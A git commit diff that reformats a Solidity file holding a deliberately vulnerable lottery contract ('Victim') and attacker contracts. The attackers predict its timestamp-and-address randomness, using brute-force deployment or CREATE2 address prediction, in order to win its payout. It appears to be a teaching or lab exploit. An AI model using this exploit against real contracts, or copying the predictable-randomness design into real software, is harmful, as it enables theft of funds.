4dd4e45d39be0f3ccc701bd5ba2189343870e8f9
0xcoinymous <0xcoinymous@gmail.com>
2025-02-05 19:05:37 +0330

    format smart contracts

--- contracts/Victim.sol
+++ contracts/Victim.sol
@@ -2,29 +2,27 @@
 pragma solidity ^0.8.19;
 
 import "@openzeppelin/contracts/proxy/Clones.sol";
-import "hardhat/console.sol";
 
 contract Victim {
     uint256 private seed;
+
     constructor(uint _seed) {
         seed = _seed;
     }
-    
-    function lottery() public payable {
-        console.log((address(this)).balance);
-        uint256 random = (block.timestamp + uint160(msg.sender) + seed) % 10;
 
-        console.log(random, block.timestamp, uint160(msg.sender), seed);
+    function lottery() public payable {
+        uint256 random = (block.timestamp + 
+            uint160(msg.sender) + 
+            seed) % 10;
 
         if (random == 5 && msg.value == 1 ether) {
-            payable(msg.sender).transfer(9 ether); 
+            payable(msg.sender).transfer(9 ether);
         }
     }
 }
 
 contract Middleman {
-    receive() external payable{}
-    
+    receive() external payable {}
     function attack(address _victim) public payable {
         Victim(_victim).lottery{value: 1 ether}();
         payable(msg.sender).transfer(address(this).balance);
@@ -33,16 +31,24 @@ contract Middleman {
 
 contract Attacker {
     event AttackStarted(address middlemanAddress, uint nonce);
-    receive() external payable{}
 
-    function deployAndCalcRNAttack(uint256 _seed, address _victim) public payable {
+    receive() external payable {}
+
+    function deployAndCalcRNAttack(
+        uint256 _seed,
+        address _victim
+    ) public payable {
         uint nonce;
         while (true) {
             address middlemanAddress = address(new Middleman());
-            uint256 random = (block.timestamp + uint160(middlemanAddress) + _seed) % 10;
+            uint256 random = (block.timestamp +
+                uint160(middlemanAddress) +
+                _seed) % 10;
             if (random == 5) {
-                console.log("nonce", nonce);
-                Middleman(payable(middlemanAddress)).attack{value: 1 ether}(_victim);
+                Middleman(payable(middlemanAddress)).attack
+                {value: 1 ether}(
+                    _victim
+                );
                 payable(msg.sender).transfer(address(this).balance);
                 emit AttackStarted(middlemanAddress, nonce);
                 break;
@@ -51,26 +57,37 @@ contract Attacker {
         }
     }
 
-    function predictAndCalcRNAttack(uint256 _seed, address _victim) public payable {
+    function predictAndCalcRNAttack(
+        uint256 _seed,
+        address _victim
+    ) public payable {
         bytes memory bytecode = type(Middleman).creationCode;
         uint nonce;
         while (true) {
-            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), nonce, keccak256(bytecode)));
+            bytes32 hash = keccak256(
+                abi.encodePacked(
+                    bytes1(0xff),
+                    address(this),
+                    nonce,
+                    keccak256(bytecode)
+                )
+            );
             address middlemanAddress = address(uint160(uint(hash)));
-            uint256 random = (block.timestamp + uint160(middlemanAddress) + _seed) % 10;
+            uint256 random = (block.timestamp +
+                uint160(middlemanAddress) +
+                _seed) % 10;
             if (random == 5) {
                 Middleman middleman;
                 uint size;
-                assembly { size := extcodesize(middlemanAddress) }
-                console.log("nonce", nonce);
-                if(size == 0){
-                    middleman = new Middleman{
-                        salt: bytes32(nonce)
-                    }();
-                }else{
-                   middleman =  Middleman(payable(middlemanAddress));
+                assembly {
+                    size := extcodesize(middlemanAddress)
                 }
-                
+                if (size == 0) {
+                    middleman = new Middleman{salt: bytes32(nonce)}();
+                } else {
+                    middleman = Middleman(payable(middlemanAddress));
+                }
+
                 middleman.attack{value: 1 ether}(_victim);
                 payable(msg.sender).transfer(address(this).balance);
                 emit AttackStarted(middlemanAddress, nonce);
